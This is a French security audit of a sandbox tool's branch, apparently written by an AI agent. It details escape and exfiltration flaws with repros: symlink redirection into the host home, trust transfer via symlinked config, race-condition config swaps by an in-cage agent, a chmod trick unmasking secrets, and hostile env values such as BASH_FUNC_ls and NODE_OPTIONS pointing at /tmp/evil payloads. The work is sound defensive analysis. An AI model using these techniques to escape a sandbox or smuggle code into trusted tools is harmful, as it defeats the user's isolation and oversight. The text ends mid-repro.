> **Note de versement.** Ce fichier est le rapport tel qu'il a été écrit sur la branche
> `claude/ops-v2-analysis-n8w5jx`, à l'octet près, précédé de ce seul bloc. Il est versé ici parce
> qu'il n'existait nulle part dans `ops-v2` et que supprimer la branche l'aurait effacé.
>
> **La branche n'a jamais été fusionnée.** Le rapport décrit ses 91 constats retenus comme
> corrigés : ils le sont *sur cette branche*, pas dans l'arbre où ce fichier est maintenant lu. Ce
> qui vaut pour `ops-v2` est dans [`etat.md`](etat.md), à côté, une ligne par constat.
>
> Contrôle d'identité — cette commande ne doit rendre que ce bloc :
>
> ```
> git show origin/claude/ops-v2-analysis-n8w5jx:AUDIT-REPORT.md \
>   | diff - audit/ops-v2-n8w5jx/AUDIT-REPORT.md
> ```

# sbx — audit de la branche `ops-v2`

Branche `ops-v2` à `d717a05`, arbre complet : `src/` (~210 000 lignes de Rust, 185 fichiers), `proc-shim/`, `build.rs`, la documentation du guide et les workflows CI.

**108 findings évalués, 92 retenus : 0 critical · 8 high · 33 medium · 51 low**, plus dix familles de duplication. **17 ont été réfutés et retirés** ; ils sont listés à la fin, avec la raison.

## Méthode

Deux voies, puis un filtre commun.

1. **Audit délégué.** Vingt-quatre auditeurs répartis sur quatre vagues, chacun avec un périmètre de fichiers borné et le modèle de menace de sa zone : le cœur d'isolement, le proxy d'egress et l'allowlist, la porte de confiance et les plans de contrôle, enfin la chaîne d'approvisionnement, la surface CLI et la duplication.
2. **Audit direct.** En parallèle, lecture directe et surtout **reproduction réelle** : le binaire de débogage de cette branche a été construit et exercé (`sbx trust`, `sbx config show`, `sbx test net`, `sbx net allow`, `sbx app import`, `sbx logs`), et les primitives système en cause ont été mesurées sous un uid non privilégié. Les findings portant un bloc **Repro** ont été exécutés sur cette machine, pas déduits.
3. **Passe de réfutation, sur la totalité.** Vingt réfuteurs, un par famille de modules, chacun distinct de l'auteur du finding qu'il examine et chargé de le *démolir* — verdict REFUTED par défaut en cas de doute, et pour consigne explicite de ne jamais croire la citation de code faite par l'auteur.

Ce qui n'a **pas** été retenu, sur consigne : style, nommage, « ajouter un test » sans défaut derrière, et durcissement spéculatif sans chemin de panne concret. Les pistes examinées puis écartées sont nommées en fin de rapport.

## Ce qui a été vérifié, et comment

**Chaque finding de ce rapport est passé devant un réfuteur.** C'est ce qui distingue cette version de la précédente, et le chiffre à retenir est ce que le filtre a coûté :

| | findings | CONFIRMED | PLAUSIBLE | REFUTED |
|---|---|---|---|---|
| Vague 1 — cœur d'isolement | 26 | 21 | 3 | 2 |
| Vagues 2-4 — tout le reste | 74 | 57 | 4 | 13 |
| Findings de l'auteur principal | 8 | 5 | 1 | 2 |
| **Total** | **108** | **83** | **8** | **17** |

Soit **16 % de findings qui n'ont pas survécu**. Le filtre a aussi **corrigé 43 gravités, toutes vers le bas** — dont les quatre CRITICAL que portait la version précédente : il n'en reste aucun. Une passe d'auditeurs non réfutée surestime, systématiquement et dans un seul sens, et c'est la mesure la plus utile de ce rapport.

Les findings **PLAUSIBLE** sont dans la liste, marqués comme tels : le code y semble faux mais le scénario n'a pas été bouclé de bout en bout.

Le réfuteur a également corrigé trois erreurs de fond de l'auteur principal, signalées à leur place dans le texte : une gravité que j'avais baissée à tort (`attach.rs:360` — la portée passe par `/dev/tty`, pas par `TIOCSTI`), une citation fausse (`binds.rs:4215` est un helper `#[cfg(test)]`, pas un précédent de production), et un finding entier qui décrivait comme un défaut un comportement documenté à son site (`ca.rs:133`).

Deux zones restent **non auditées**, faute d'auditeur dans la fenêtre disponible : `src/sandbox/egress.rs`, `egress_stats.rs`, `netlearn.rs`, et le plan des tâches (`task.rs`, `task_control.rs`, `taskpool.rs`, `task_shim.rs`, `proc_control.rs`). Les chemins de connexion du proxy, également perdus par leur auditeur, ont été audités directement ici.

## Ce que l'audit dit de la branche

L'arbre est en bon état et il faut le dire avant la liste. `cargo fmt`, `cargo clippy --all-targets -D warnings` et `cargo test --bins` passent tous (2745 tests, 0 échec) ; aucun `TODO`, `FIXME` ou `unimplemented!` dans `src/` ; aucun test d'assertion désactivé. Les zones les plus sensibles — le lecteur OpenPGP, le shim d'application en cage, la porte d'ouverture des fichiers de config — ont été lues intégralement sans finding retenu, et le détail est en fin de rapport.

Les défauts retenus se rangent presque tous dans un même motif, et c'est le résultat le plus utile : **ce ne sont pas des contrôles absents, ce sont des contrôles présents auxquels un chemin échappe.** `cagedir::ensure_under` existe et un site sur quatre ne l'utilise pas. `Rule::matches_deny` existe et un des deux plans ne l'appelle pas. `trust::trust_written` existe et deux des quatre sites de re-confiance appellent la forme qui relit le fichier. `store.rs` contrôle que `XDG_DATA_HOME` est absolu et pas `$HOME`, alors que `trust.rs` fait ce contrôle sur la même variable en expliquant pourquoi. `config/tasks.rs` refuse déjà `NODE_OPTIONS` et `PYTHONSTARTUP` pour une tâche, et la denylist `[env]` du lancement ne les refuse pas.

Dans chaque cas le code correct est dans l'arbre, à quelques lignes de l'endroit qui l'ignore. Cela rend les correctifs courts et à faible risque — et explique pourquoi ces défauts ont survécu aux passes précédentes : ils ne se voient pas en lisant le module qui a raison.

---

## HIGH (8)

### `src/sandbox/binds.rs:1589` — les parents `[open]` sont créés avec un `create_dir_all` qui suit les liens, dans le `$HOME` que la cage écrit, puis bind-montés
*security*

**Scénario :** `rt.home_src` est le `$HOME` de la cage, monté **read-write** (`binds.rs:597`). Quand `[open]` est configuré, `build_spec` crée les parents de `.local/share/applications` et `.config/mimeapps.list` sous ce répertoire avec un `DirBuilder::new().recursive(true)` — c'est-à-dire un `create_dir_all` — puis `cage_mounts` émet pour chaque composant intermédiaire (`.local`, `.local/share`, `.config`) un `Mount::Bind` **read-write** dont la *source* est `home_src.join(rel)` (`binds.rs:657`, `724-743`).

`src/sandbox/cagedir.rs` existe exactement pour interdire cette forme. Son en-tête : « everything *below* the bind's mount point is an entry untrusted in-cage code may replace with a symlink and leave behind for the next launch to walk into. `create_dir_all` cannot see that: it stats through a link, finds a directory, and reports the parents as made. […] Each of those was found as its own defect before this module existed. » Huit lignes plus bas, `binds.rs:1616-1621` fait les choses correctement pour le pool mise, en passant `(ancre, rel)` à `miseplugin::register` → `cagedir::ensure_under`, avec le commentaire « everything under a bind's mount point is cage-writable, so `register` has to know where the trusted prefix ends in order to refuse a component the cage repointed ». La ligne 1589 est le site qui a été oublié.

Pourquoi la cage peut poser le lien : les pins de `binds.rs:657` ne sont émis que si `[open]` est configuré (`open_rels` est construit depuis `open_apps_src`/`open_mimeapps_src`, `None` sinon). Dans n'importe quel lancement du même projet **sans** `[open]` — avant que l'utilisateur ne l'ajoute, ou pour une autre app — `$HOME/.local` et `$HOME/.config` sont de simples répertoires inscriptibles dans la cage. Le commentaire de `binds.rs:639-646` le dit lui-même, et ferme l'attaque par *renommage* avec les pins tout en laissant ouverte l'attaque par *lien laissé derrière soi* contre la marche côté hôte. Poser le lien ne coûte rien à la cage et n'y est pas observable (dans la cage, la cible n'existe pas).

Au lancement suivant : (a) `create_dir_all` traverse le lien et **crée un répertoire dans le vrai home de l'utilisateur** ; (b) bwrap reçoit ce lien comme *source* de `--bind`, et bwrap résout une source de bind côté hôte — le home réel atterrit donc **read-write** sur `$HOME/.local` dans la cage : `~/.ssh`, profils de navigateur et identifiants cloud lisibles, `~/.bashrc` et `~/.ssh/authorized_keys` inscriptibles. C'est la totalité de « confidentiality by absence », et le côté écriture est une primitive de persistance sur l'hôte.

La doc de `home_mountpoint_pins` affirme d'ailleurs la propriété qui est violée : « The sources are the home's own subdirectories, which the caller has created (see `build_spec`) ».

**Repro :** exécutée sur cette machine, en Rust autonome contre les mêmes primitives.

```
home_src/.local  ->  symlink vers le home de la victime
DirBuilder::new().recursive(true).mode(0o700).create(home_src/".local/share")

  create_dir_all(.../home/.local/share)  -> Ok
  /var/tmp/fake-user-home/share exists   : true      <-- a écrit DANS le home de la victime
  pin source                             : .../home/.local
  is a symlink                           : true
  resolves to                            : /var/tmp/fake-user-home
  reachable through it                   : Ok("PRIVATE KEY")
```

**Vérif :** chronologie établie depuis l'historique de la branche : `5810a8d` (2026-08-16, « feat: URI routing, app-lifecycle and config-view work from the audit pass ») introduit `openuri.rs` et la marche des parents `[open]` ; `e2d9f54` (2026-08-24, « fix(mise): refuse a plugins directory the cage pointed out of the home ») introduit `cagedir.rs` pour clore cette classe de bug et convertit le site mise. Le site `[open]` est antérieur au garde-fou et n'a jamais été converti. Des quatre emplacements que l'en-tête de `cagedir` désigne comme ayant eu ce défaut, trois sont fermés — le store nix par projet (`projectstore.rs:623`), l'enregistrement du plugin mise (`miseplugin.rs:86`) et le keyfile de thème (`theme_relay.rs:238`, qui le résout par `openat` relatif à un descripteur + `O_NOFOLLOW`) — et `[open]` est le seul encore ouvert. Recherche exhaustive des écritures côté hôte sous `home_src` : `binds.rs:1589` est la seule occurrence (les autres `DirBuilder` de `binds.rs` visent `etc_dir`, hors de tout montage inscriptible, ou l'ancre elle-même).

**Correctif :** utiliser le garde-fou déjà présent dans l'arbre —

```rust
for rel in [APPLICATIONS_REL, MIMEAPPS_REL] {
    if let Some(parent_rel) = Path::new(rel).parent() {
        super::cagedir::ensure_under(&rt.home_src, &parent_rel.to_string_lossy(), 0o700)?;
    }
}
```

et, en ceinture-bretelles, faire refuser par `home_mountpoint_pins` toute source dont `symlink_metadata` n'est pas un répertoire, pour que le plan de montage ne puisse pas transporter un composant redirigé même si un futur appelant régresse.

---
---

### `src/trust.rs:211` — la porte de confiance est transférable d'un projet à l'autre par un `.sbx.toml` symlink
*security*

**Scénario :** le marqueur qui enregistre « l'utilisateur a cautionné cette config » est indexé par le chemin **canonique** du fichier de config (`canonical_string`, `trust.rs:188` → `marker_path`, `trust.rs:207`), alors que la config gouverne le **cwd** (`load.rs:520`, `let path = cwd.join(PROJECT_CONFIG)`). Un projet dont le `.sbx.toml` est un lien symbolique vers une config approuvée ailleurs se relit donc comme *trusted*, et ses champs sensibles s'appliquent, sans que l'utilisateur ait jamais cautionné ce projet-là. `read_safe_bytes` suit le lien (`config/safety.rs:73`, ouverture sans `O_NOFOLLOW`) et le verdict de sûreté passe, la cible étant un fichier régulier appartenant à l'utilisateur.

Impact : le projet non approuvé hérite de l'ensemble du jeu de champs cautionnés d'une config quelconque de la machine — `network = "shared"` supprime purement et simplement le proxy d'egress et l'allowlist, et `binds`, `secrets`, `packages` et les définitions d'app suivent. L'attaquant a besoin du chemin absolu d'une config approuvée ; une copie voisine (`../<autre-repo>/.sbx.toml`) est la supposition bon marché, et un agent déjà en cage connaît le chemin hôte de son propre projet — celui-ci est monté à son propre chemin hôte — donc il peut écrire le lien lui-même et attendre le lancement suivant.

**Repro :** exécutée contre un build debug de cette branche.

```
projA/.sbx.toml :  binds = [{ path = "/etc/hostname", mode = "ro" }]
                   network = "shared"

(cd projA && sbx trust)          -> sbx: trusted .sbx.toml
ln -s $PWD/projA/.sbx.toml projB/.sbx.toml
(cd projB && sbx trust --show)   -> sbx: .sbx.toml is trusted        <-- jamais approuvé
(cd projB && sbx config show)    -> network: shared (host network)  (project)

(cd projC && sbx config show)    -> warning: .sbx.toml is untrusted: dropping 1 bind(s)
                                    warning: ignoring `network` policy (untrusted)
```

`projC` détient une **copie** octet pour octet de la même config et est correctement refusé : la cause est donc bien le lien, pas le contenu.

**Vérif :** un lien *physique* ne produit pas cet effet (`canonicalize` ne le résout pas, la clé diffère), une copie non plus. Seul le lien symbolique transfère le marqueur. `tests/trust.rs` n'a aucun cas symlink ; le test le plus proche, `two_paths_that_differ_only_in_invalid_bytes_do_not_share_a_trust`, traite les collisions de clé mais pas ce cas.

**Correctif :** par ordre de préférence — (1) indexer le marqueur sur le répertoire de projet que la config gouverne (le parent canonique de `cwd/.sbx.toml`) conjointement au hash de contenu, de sorte qu'une config partagée par lien soit cautionnée une fois par projet, ce qui est ce que le modèle entend par « confiance » ; (2) sinon, refuser un `.sbx.toml` qui est un lien symbolique, via `O_NOFOLLOW` dans `read_safe_bytes` ou un contrôle `symlink_metadata` — l'idiome est déjà dans l'arbre, en `src/config/manage.rs:1417`, sur le chemin d'*écriture* de la config et pour la même raison.

---

---
---

### `src/config/mod.rs:132` — la denylist des clés `[env]` réservées laisse passer `BASH_FUNC_*` et les points d'entrée de code des interpréteurs
*security*

**Scénario :** `[env]` est l'un des deux champs qu'un projet **non approuvé** peut poser, moins cette denylist. La doc de la liste énonce elle-même la menace — « to stop an untrusted project from silently reconfiguring the *execution environment* of the user's own later (Mode A) sessions and the trusted tools they run in that project » — et ferme la famille bash (`BASH_ENV`, `ENV`, `PROMPT_COMMAND`, `PS1`), le loader (`LD_*`, `NIX_LD*`), le jeu `AT_SECURE` de la glibc, les clés proxy/CA et tout l'espace `SBX_*`, avec la règle affichée « completely, since a single missed pointer leaves the hole open ».

**Repro :** un `.sbx.toml` non approuvé portant ces clés ne se voit refuser que `LD_PRELOAD` ; `sbx config show` résout tout le reste avec la provenance `(project)` :

```
BASH_FUNC_ls%%=() { /tmp/evil; }     <-- fonction bash exportée, importée par tout bash
NODE_OPTIONS=--require /tmp/evil.js
PYTHONSTARTUP=/tmp/evil.py
PYTHONPATH=/tmp/evilmods
PERL5OPT=-Mevil
RUBYOPT=-revil
ZDOTDIR=/tmp/evilzsh
GIT_SSH_COMMAND=/tmp/evil.sh
```

`BASH_FUNC_*` est le plus tranchant : c'est la menace que la liste nomme déjà, dans l'orthographe qu'elle ne couvre pas, et il ne demande aucune invite interactive — vérifié sur bash 5.2.21 :

```
$ env 'BASH_FUNC_ls%%=() { echo LS-HIJACKED; }' bash -c 'ls'
LS-HIJACKED
```

Donc tout `bash -c` non interactif qu'un outil approuvé lance dans cette cage exécute le code du projet sous le nom d'une commande ordinaire. `NODE_OPTIONS`, `PYTHONSTARTUP`, `PERL5OPT` et `RUBYOPT` sont la même classe pour node/python/perl/ruby, et l'arbre du projet est monté read-write : la charge utile qu'ils désignent est un fichier que le projet livre. `GIT_SSH_COMMAND` exécute un programme arbitraire à chaque opération git distante.

**Vérif :** `is_reserved_env_key` traite déjà `LD_` et `SBX_` comme des **préfixes** ; `BASH_FUNC_` s'ajoute au même endroit et de la même façon. La table « devrait être réservé » de `src/config/tests.rs:4743` est le point d'extension des tests.

**Correctif :** ajouter le préfixe `BASH_FUNC_` et les noms de chargement de code des interpréteurs — `NODE_OPTIONS`, `PYTHONSTARTUP`, `PYTHONPATH`, `PERL5OPT`, `PERL5LIB`, `RUBYOPT`, `RUBYLIB`, `ZDOTDIR`, `GIT_SSH_COMMAND`.

---
---

### `src/sandbox/fsmask.rs:311` — la cage peut rouvrir elle-même un masque `[fs] deny`, ce que la documentation déclare impossible
*security*

**Scénario :** `Path::exists()` vaut `metadata(..).is_ok()` : il répond **false** non seulement pour un chemin absent mais pour un chemin dont le répertoire parent n'est pas traversable par l'appelant — y compris quand l'appelant est le propriétaire de ce répertoire. La cage tourne sous l'uid de l'utilisateur et détient l'arbre du projet en écriture : elle peut donc rendre son propre répertoire non traversable et faire lire un chemin masqué comme absent au lancement suivant.

```
session 1 (masqué)     l'agent exécute :  chmod 000 sub          # sub/secrets.env est masqué
lancement suivant      fsmask::admit -> exists() == false
                       -> Ok(None) -> matched == 0
                       -> warning « `[fs] deny` entry `sub/secrets.env` matches nothing in this
                          project — nothing is closed by it »
                       -> AUCUN masque monté, le lancement continue
session 2 (non masqué) l'agent exécute :  chmod 755 sub && cat sub/secrets.env   -> SECRET
```

**Repro :** mesuré directement sous l'uid propriétaire non-root (4242) sur cette machine :

```
$ setpriv --reuid=4242 ... python3 -c "print(os.path.exists('.../sub/secrets.env'))"
  exists -> False
$ setpriv --reuid=4242 ... sh -c "chmod 755 .../sub && cat .../sub/secrets.env"
  chmod back: OK
  SECRET
```

**Vérif :** `resolve_list` (`fsmask.rs:252-271`) ne transforme jamais un non-appariement en refus : c'est un avertissement, et le lancement se poursuit sans le montage. `fsmask::expand` n'est appelé qu'au lancement (`launch.rs:4820`). Ce qui rend le point important dépasse le masque lui-même : `docs-site/docs/guide/configuration/fs.md:209-227` énumère les trois trous de `[fs] deny` puis affirme « **The cage cannot open any of these itself**: it cannot create a hard link across a mask, and it cannot write a file into a denied directory. They are ways the *host side* can leave a path open, which is why they are worth knowing rather than worth panicking about. » Ceci est un quatrième trou et il est ouvrable par la cage : cette phrase n'est donc pas exacte aujourd'hui. L'avertissement que l'utilisateur reçoit induit en erreur : « matches nothing in this project » se lit comme une entrée de config périmée, pas comme une protection qui vient de disparaître.

**Correctif :** distinguer « absent » de « illisible ». Remplacer `candidate.exists()` par un `symlink_metadata`, et traiter une `Err` dont le `kind` n'est pas `NotFound` comme un refus (`out.refused`) et non comme un avertissement : une entrée `deny` qui ne peut pas être résolue doit faire échouer le lancement, puisque toute sa raison d'être est que le chemin ne soit pas atteignable. `admit` renvoie déjà `Err` pour un échec de `stat` plus bas (ligne 325) : l'intention est là, c'est le raccourci `exists()` au-dessus qui avale le cas.

---
---

### `src/cli/config.rs:3058` — `config set|add|rm|unset --trust` blesses the file re-read from disk, not the bytes sbx wrote (TOCTOU)
*security*

**Scénario :** A user has a trusted project `.sbx.toml` and an agent running in the cage of that project (the tree is bound rw, same uid). The user runs `sbx config set --local --trust env.FOO bar`. `admit_config_write` sees Trusted and admits. `manage::set` writes the file. Before `report_write_trust` reaches `trust::trust`, the in-cage agent overwrites `.sbx.toml` with its own content (`network = "shared"`, `binds = ["/:rw"]`, a `[secret]` block). The file is owner-owned and 0644, so `read_safe_bytes` accepts it; sbx hashes it and writes the trust marker. `sbx config set` prints `trusted …` and exits 0, and the next `sbx run` honours every security field the agent wrote. Through `sbx net allow --local` the identical race is harmless, because that path hashes the bytes sbx composed.

**Correctif :** Make `manage::set/add/remove/unset` return the composed text (as `add_egress_rule` already does via `Written { text, outcome }`) and have `report_write_trust` take those bytes and call `trust::trust_written` instead of `trust::trust`. Leave `config edit` on `trust::trust`, where re-reading is the point.

---
---

### `src/cli/net.rs:3507` — Rule-removal re-trust reads the file back instead of hashing the bytes it wrote, reopening the documented cage TOCTOU
*security*

**Scénario :** A project's `.sbx.toml` is trusted and an agent is running with the project bound read-write into its cage. The user runs `sbx net unallow api.example.com` (or `sbx proc undeny /usr/bin/curl`). `remove_rule_from` rewrites the file; before `trust::trust` re-opens it microseconds later, the in-cage payload overwrites `.sbx.toml` with its own content — `[network] mode = "allow"`, a `[secret."attacker.tld"]` block, extra `binds`. `trust::trust` reads those bytes, hashes them, and writes a valid trust marker. From the next launch the payload's security fields are honored as user-approved configuration. With `trust_written` the same race is fail-safe: the marker covers sbx's bytes, the swapped file no longer matches, and the next launch drops it.

**Correctif :** Make `remove_egress_rule`/`remove_proc_rule` return the serialized document alongside `RemoveOutcome` (mirroring `Written`), and call `trust::trust_written(store, &path, text.as_bytes())` in both `persist_egress_removal` (net.rs:3507) and `persist_proc_removal` (proc.rs:231).

---
---

### `src/sandbox/proxy/websocket.rs:1060` — Frames pipelined behind the handshake are handed to the upstream before the leak scan runs
*security*

**Scénario :** With `[network] websocket_secret = block`, the cage writes in one TLS burst: `GET /chat HTTP/1.1\r\nHost: chat.example\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: x\r\n\r\n` immediately followed by a masked text frame whose payload is a credential learned on `other.example`. `read_head_buffered` consumes only the head, so the frame sits in `br.buffer()` and becomes `client_pending`. Line 1060 encrypts it into the upstream connection; line 1103 sees the needle; lines 1106-1109 send `close_notify` and flush — delivering the frame with the credential to `chat.example` before closing. The block is announced (the sighting is logged) but did not block.

**Correctif :** Move the two `write_all` seeds after the `follow()`/`pending_seen` gate (write `client_pending` into `upstream.conn.writer()` only once the scan has cleared it), mirroring the order the main loop uses.

---
---

### `src/sandbox/attach.rs:360` — le bras stdio hérité de `attach` ne fait pas de `setsid`
*security*

**Scénario :** dans `confine_and_exec`, le bras `TtyMode::Pty` appelle `login_tty` (qui fait le `setsid`), et le bras `TtyMode::Inherit` ne fait rien. Or le terminal de contrôle est une propriété de la **session**, héritée à travers `fork` : le commentaire « no controlling terminal » est donc inexact, le processus joint garde celui de `sbx session attach`. Tous les autres chemins de lancement émettent `--new-session` (`argv.rs:156`), et `argv.rs:153` explique que la seule exception est le pty privé, où `login_tty` fait le travail.

**Vérif :** j'avais d'abord ramené ce finding à medium en observant que l'exploitation classique, `ioctl(TIOCSTI)`, est fermée par ailleurs — `seccomp.rs:83-85` refuse `TIOCSTI` et `TIOCLINUX`, comparés en `Dword` depuis un correctif antérieur de cette branche, et `attach` réapplique les filtres. **C'était une erreur de ma part**, corrigée par le réfuteur : la portée ne passe pas par `TIOCSTI`. `binds.rs:589` émet `Mount::Dev{/dev}` → `--dev /dev`, et `/dev/tty` est le périphérique magique 5:0 qui résout vers le terminal de contrôle de *celui qui l'ouvre*, quel que soit l'espace de noms de montage. Un processus en cage qui garde le terminal de contrôle de `sbx session attach` peut donc l'ouvrir, **y lire les frappes de l'utilisateur**, y écrire et manipuler ses termios — sans avoir besoin du seul appel que seccomp ferme. High confirmé.

---

---

## MEDIUM (33)

### `src/sandbox/proxy/websocket.rs:596` — la charge utile d'une trame de contrôle au-delà de 125 octets est relayée sans être scannée
*security*

**Scénario :** le détecteur de fuite sortante d'un WebSocket rassemble la charge utile d'une trame de contrôle pour la scanner entière, bornée par `CONTROL_MAX` :

```rust
let room = CONTROL_MAX.saturating_sub(self.control_payload.len());
let fits = piece.len().min(room);
self.control_payload.extend_from_slice(&piece[..fits]);
```

`CONTROL_MAX` vaut 125, la limite que RFC 6455 §5.5 impose à une trame de contrôle, et le commentaire justifie la borne ainsi : « a frame claiming more is not a control frame, and the buffer must not grow on its say-so ». Le raisonnement est juste pour la mémoire, mais sa conclusion n'est pas appliquée au relais : **la trame est quand même transmise en entier**. Le tee ne fait que copier ; ce sont les octets du flux qui partent. Une cage qui émet un `PING` déclarant un mébioctet de charge utile fait donc scanner ses 125 premiers octets et relaie le reste, non scanné, vers l'hôte autorisé.

**Vérif :** relu ligne à ligne. Aucun emplacement du fichier ne refuse une trame de contrôle surdimensionnée — `grep` sur `CONTROL_MAX` ne trouve que la déclaration, le commentaire et la borne du tampon. Un serveur conforme fermera la connexion en voyant la trame, mais les octets ont déjà été écrits sur la socket : un point de terminaison contrôlé par l'attaquant les lit avant de fermer. Portée à nommer honnêtement : `WS` est un opt-in explicite — `Methods::admits` refuse le pseudo-verbe à une règle qui ne le nomme pas, parce que c'est « a distinct, unredactable bidirectional capability ». Il faut donc que l'utilisateur ait déjà ouvert WS vers cet hôte ; le détecteur est le contrôle compensatoire de cette ouverture, et il est ici contournable pour un volume arbitraire.

**Correctif :** appliquer la conclusion que le commentaire tire déjà — une trame de contrôle qui déclare plus de 125 octets n'en est pas une : refuser la trame (et la connexion), ce qui est aussi le comportement conforme, au lieu de se contenter de borner le tampon.

---
---

### `src/sandbox/proxy/h2mitm.rs:864` — le détecteur de fuite sortante ne scanne jamais `:method` sur le plan HTTP/2
*security*

**Scénario :** `head_carries_secret` reconstruit un tampon à scanner à partir de `:path` (via `path_and_query()`) puis de chaque `name: value` des en-têtes ordinaires :

```rust
if let Some(pq) = req.uri().path_and_query() { blob.extend_from_slice(pq.as_str().as_bytes()); … }
for (name, value) in req.headers().iter() { … }
```

En HTTP/2 les pseudo-en-têtes ne sont pas dans `req.headers()` : la crate `http` expose la méthode par `req.method()`. `:method` n'entre donc jamais dans le tampon scanné. Or un jeton de méthode HTTP/2 est un `token` RFC 9110 — lettres, chiffres et `!#$%&'*+-.^_\`|~` — ce qui accueille sans peine un secret hexadécimal ou un jeton de la forme `ghp_…`. La cage envoie une requête dont `:method` porte le secret vers un hôte autorisé ; le détecteur ne voit rien et la requête part avec.

**Vérif :** relu. L'asymétrie est le point : le détecteur HTTP/1.1 scanne les octets bruts de la tête, qui **contiennent la ligne de requête** et donc la méthode ; la version HTTP/2 reconstruit un tampon et oublie les pseudo-en-têtes. Portée à nommer : la règle d'allowlist met la méthode en majuscules avant d'apparier, donc un préfixe `{GET,POST}` refuserait le jeton — il faut une règle sans préfixe de méthode. Et le plan h2 est lui-même opt-in par hôte (`[network] http2`). Cela reste un canal de sortie complet pour un secret, sur le plan dont le détecteur est le seul contrôle.

**Correctif :** ajouter `req.method()` — et, par la même logique, `:authority` et `:scheme` — au tampon reconstruit, ou mieux, dériver ce tampon d'une sérialisation unique partagée avec le chemin HTTP/1.1, pour que les deux plans ne puissent plus diverger sur *ce qui compte comme la tête*.
---

### `src/sandbox/proc_enforce.rs:1266` — un `openat2` portant un bit `resolve` récupère la fenêtre d'échange que `[fs] scan` déclare avoir supprimée
*security* — verdict **PLAUSIBLE**

**Scénario :** la propriété centrale du scan, telle que sa propre documentation l'énonce (`docs-site/docs/guide/configuration/fs.md`, « What an allow hands over ») : « When a scan comes back clean, sbx gives the cage a descriptor for the file it just read, **rather than letting the open run a second time from the path the cage wrote**. That distinction matters against a cage with more than one thread: an open that re-runs re-walks its path argument, and a sibling thread is free to have pointed it somewhere else while the scan was in progress, so the file that arrives would not be the file that was read. » La même page ajoute : « **One gap is left, and it is not one a cage can arrange**: a kernel older than 5.9… ».

Or un `openat2` portant un `resolve` non nul est décliné ici (`match open_resolve(..) { Some(0) => {}, _ => return false }`) et répondu `CONTINUE`, ce qui est exactement la seconde marche que le paragraphe ci-dessus exclut — et la cage l'obtient en choisissant la forme de l'appel système, sans privilège ni course pour ouvrir la fenêtre.

Précision, car le cadrage compte : ceci ne **contourne pas** le scan. La lentille lit et juge toujours la cible, et un refus refuse toujours. Ce qui est rendu, c'est la fenêtre d'échange entre le jugement et la remise. Un thread de la cage ouvre `a` (anodin) avec `openat2(dirfd, "a", {flags: O_RDONLY, resolve: RESOLVE_NO_SYMLINKS})` ; la lentille scanne `a`, l'autorise, décline la remise, et le noyau ré-résout `"a"` — un thread frère qui a renommé le `secrets.env` refusé par le scan sur `a` pendant cette fenêtre remet à la cage le fichier que le scan existe pour refuser. La boucle est répétable à volonté.

**Vérif :** le commentaire de `proc_enforce.rs:1257-1265` a raison sur la tension qu'il nomme — remettre un descripteur obtenu par une sonde qui suit les liens à un appelant ayant demandé `RESOLVE_NO_SYMLINKS` supprimerait silencieusement le durcissement de cet appelant. Le problème est le sens dans lequel l'arbitrage a été rendu, et qu'il l'ait été sans le dire : toute la propriété du scan est dépensée pour préserver un drapeau de durcissement au bénéfice d'un appelant qui, dans ce modèle, est du code non fiable. Trouvé par l'auditeur de la phase 1 ; relu et resserré ici.

**Correctif :** conserver la remise **et** honorer les drapeaux, en effectuant la sonde avec la sémantique `resolve` de l'appelant — `openat2` côté hôte sur le même chemin relatif au même `dirfd`, avec la valeur `resolve` de l'appelant — et en servant ce descripteur ; une sonde qui échoue sous cette sémantique est répondue avec l'errno que le noyau aurait renvoyé. À défaut, refuser plutôt que `CONTINUE`, pour que la propriété tienne et que le coût soit visible. Dans les deux cas, la phrase « one gap is left, and it is not one a cage can arrange » de `fs.md` doit changer.

---
---

### `src/allowlist/mod.rs:1516` — sur le plan cleartext, la liste `deny` est interrogée avec la question `WS` du côté *allow*, donc un `deny` ne peut pas refuser un WebSocket
*security*

**Scénario :** `Rule::matches_deny` (`allowlist/mod.rs:465`) existe précisément pour qu'une règle `deny` lise son jeu de méthodes largement (`Methods::admits_deny`), et la doc de `admits_deny` (lignes 257-264) explique pourquoi : lire l'opt-in `WS` du côté allow sur un `deny` « does the exact opposite of its purpose — it narrows every deny an operator can write ». `EgressPolicy::explain` (ligne 1439) utilise correctement `r.matches_deny(&req, &method)` pour son balayage `deny`. `EgressPolicy::explain_clear` (ligne 1516) utilise `r.matches(&req, &method)` — le prédicat du côté *allow*.

Conséquence : sur le plan cleartext (`http://`), une règle `deny` qui ne nomme pas littéralement `WS` dans un préfixe `{...}` ne s'applique pas à une requête `WS`. Comme `Methods::Unspecified` (un `deny host` nu) renvoie `false` depuis `admits("WS")`, un `deny api.test` nu ne refuse pas la négociation WebSocket sur le plan cleartext, alors qu'il la refuse sur le plan inspecté.

**Vérif :** trouvé par l'auditeur de la phase 2, qui l'a établi en exécutant le matcher ; relu ligne à ligne ici et confirmé sur la source. La portée est étroite et je la nomme plutôt que de la taire : le plan cleartext est opt-in (`allow_insecure_http` plus une règle `http://`), et pour que la requête soit *autorisée* le bras allow passe par le même `matches`, donc la règle allow doit nommer `WS`. Le scénario est donc précisément « j'ai ouvert WS vers cet hôte, je veux maintenant le refermer » — et cela échoue en silence. Medium-haut plutôt que haut pour cette raison.

**Correctif :** appeler `matches_deny` dans le bras `deny` de `explain_clear`, comme le fait `explain`.

---
---

### `src/config/fspolicy.rs:108` — un projet non approuvé rétrécit encore la fenêtre de `[fs] scan` quand l'utilisateur s'en remet au plafond intégré
*security*

**Scénario :** l'arbre a déjà corrigé la moitié évidente. `FsPolicy::union` plie `scan_max_kb` avec `max`, et le commentaire de `fspolicy.rs:91-107` comme le test `a_union_can_only_ever_widen_the_scan_window_never_shrink_it` nomment l'attaque : « since the table is honoured from an untrusted project, `scan_max_kb = 1` in a cloned repo's `.sbx.toml` shrank the user's own window to one KiB and let every credential past the first line through ».

Ce que le correctif ne couvre pas, c'est le cas où l'utilisateur n'a posé **aucun** `scan_max_kb` et s'en remet au plafond intégré — ce que le guide lui dit de faire (« Leave it unset for the built-in ceiling »). Le plafond n'est pas représenté comme une valeur dans le pli : il ne participe donc jamais au `max`, et le bras `(None, other) | (other, None) => other` prend telle quelle la valeur du projet non approuvé. Le test épingle d'ailleurs ce cas comme correct :

```rust
let mut from_extra = with_ceiling(None);
from_extra.union(with_ceiling(Some(32)));
assert_eq!(from_extra.scan_max_kb, Some(32));   // se lit « une couche en a posé un »,
                                                 // est en fait « une couche a rétréci l'intégré »
```

**Repro :** mesuré contre le binaire de cette branche.

```
